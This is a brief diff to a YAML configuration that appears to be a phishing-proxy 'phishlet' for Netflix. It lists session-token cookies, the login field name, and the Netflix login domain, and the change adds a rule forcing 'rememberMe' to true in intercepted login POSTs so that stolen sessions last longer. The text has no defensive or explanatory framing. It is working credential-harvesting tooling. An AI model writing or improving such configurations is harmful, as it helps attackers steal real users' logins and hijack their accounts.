@@ -16,7 +16,7 @@ auth_tokens:
 auth_urls:
   - '/browse'
   - '/signup'
-
+    
 credentials:
   username:
     key: 'userLoginId'
@@ -30,3 +30,9 @@ credentials:
 login:
   domain: 'www.netflix.com'
   path: '/login'
+
+force_post:
+  - path: '/(.*)/login'
+    force:
+      - {key: 'rememberMe', value: 'true'}
+    type: 'post'
